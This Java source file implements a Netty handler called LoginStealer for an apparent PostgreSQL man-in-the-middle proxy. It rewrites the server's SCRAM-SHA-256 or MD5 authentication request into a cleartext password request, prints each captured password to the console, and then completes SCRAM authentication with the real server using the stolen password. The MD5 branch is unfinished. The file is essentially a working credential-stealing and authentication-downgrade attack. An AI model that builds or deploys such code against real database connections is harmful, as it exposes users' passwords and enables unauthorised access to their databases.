package dev.bandarlog.test.netty.proxy.postgres.lean.auth;

import static dev.bandarlog.test.netty.proxy.postgres.lean.codec.MessageFactory.buildAuthenticationResponse;
import static dev.bandarlog.test.netty.proxy.postgres.lean.codec.MessageFactory.buildSASLInitialResponse;
import static dev.bandarlog.test.netty.proxy.postgres.lean.codec.MessageFactory.buildSASLResponse;

import java.util.HashMap;
import java.util.Map;

import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor;
import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor.Listener;
import com.bolyartech.scram_sasl.client.ScramSaslClientProcessor.Sender;
import com.bolyartech.scram_sasl.client.ScramSha256SaslClientProcessor;

import dev.bandarlog.test.netty.proxy.postgres.lean.codec.PostgresMessages;
import dev.bandarlog.test.netty.proxy.postgres.lean.codec.PostgresMessages.AuthenticationResponse;
import dev.bandarlog.test.netty.proxy.postgres.lean.codec.PostgresMessages.AuthenticationResponse.AuthenticationResponseType;
import dev.bandarlog.test.netty.proxy.postgres.lean.codec.PostgresMessages.Password;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelPromise;

/**
 * This class here implements the MITM logic:
 * <ul>
 * <li>Forwards the stolen credentials to the server</li>
 * </ul>
 */
public class LoginStealer extends ChannelDuplexHandler {

	private static final ChannelFutureListener FIRE = ChannelFutureListener.FIRE_EXCEPTION_ON_FAILURE;

	private final Map<String, String> parameters = new HashMap<>();
	
	private AuthenticationResponseType authType;

	/** used if authType == MD4 **/
	private final byte[] salt = new byte[4];

	/** used if authType == SASL **/
	private ScramSaslClientProcessor saslProcessor;

	@Override
	public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {

		if (msg instanceof Password) {
			final Password password = (Password) msg;
			final String pass = password.getPassword();

			System.out.println("/!\\ Got password: " + pass);

			if (authType == AuthenticationResponseType.MD5) {
				// TODO: craft MD5 password
			} else if (authType == AuthenticationResponseType.SASL) {
				saslProcessor.start("", pass);
			} else if (authType == AuthenticationResponseType.CLEARTEXT) {
				// send as is
				super.channelRead(ctx, msg);
				// return immediatly, as not to release.
				return;
			} else if (authType == AuthenticationResponseType.OK) {
				// auth was already okay, so just say that to the client.
				final AuthenticationResponse fakeResponse = buildAuthenticationResponse(ctx.alloc(), AuthenticationResponseType.OK);
				
				super.channelRead(ctx, fakeResponse);
			}

			password.release();
		} else {
			super.channelRead(ctx, msg);
		}
	}

	@Override
	public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {

		if (msg instanceof AuthenticationResponse) {
			final AuthenticationResponse response = (AuthenticationResponse) msg;

			authType = response.getAuthenticationResponseType();
			System.out.println("authType = " + authType);
			
			if (authType == AuthenticationResponseType.OK || authType == AuthenticationResponseType.CLEARTEXT) {
				// we're good.
			} else if (authType == AuthenticationResponseType.MD5) {
				// TODO: read salt
			} else if (authType == AuthenticationResponseType.SASL) {
				// start the SASL negociation
				final Listener listener = new ScramListener();
				final Sender sender = new ScramSender(ctx);
				
				// TODO: choose the appropriate client processor from the given list
				saslProcessor = new ScramSha256SaslClientProcessor(listener, sender);
			} else if (response.getAuthenticationResponseType() == AuthenticationResponseType.SASL_CONTINUE
					|| response.getAuthenticationResponseType() == AuthenticationResponseType.SASL_FINAL) {
				final String message = response.getPayload();

				// forward to the next step
				saslProcessor.onMessage(message);
				
				// also, do not send anything to the client.
				promise.setSuccess();
				response.release();
				return;
			} else {
				// Throw: unexpected authentication mecanism.
			}

			response.release();

			// send a cleartext instead
			super.write(ctx, buildAuthenticationResponse(ctx.alloc(), AuthenticationResponseType.CLEARTEXT), promise);

			return;
		} else {
			super.write(ctx, msg, promise);
		}
	}

	private final class ScramSender implements Sender {
		
		private final ChannelHandlerContext ctx;
		
		private boolean firstResponse = true;

		ScramSender(ChannelHandlerContext ctx) {
			this.ctx = ctx;
		}

		@Override
		public void sendMessage(String msg) {
			final PostgresMessages message;
			if (firstResponse) {
				message = buildSASLInitialResponse(ctx.alloc(), "SCRAM-SHA-256", msg);
				firstResponse = false;
			} else {
				message = buildSASLResponse(ctx.alloc(), msg);
			}
			ctx.fireChannelRead(message.retain());
		}
	}

	private static final class ScramListener implements Listener {
		public ScramListener() {
			// TODO Auto-generated constructor stub
		}

		@Override
		public void onSuccess() {
			System.out.println("/!\\ SASL Success !");
		}

		@Override
		public void onFailure() {
			System.out.println("/!\\ SASL Failure !");
			// TODO: send error message
		}
	}
}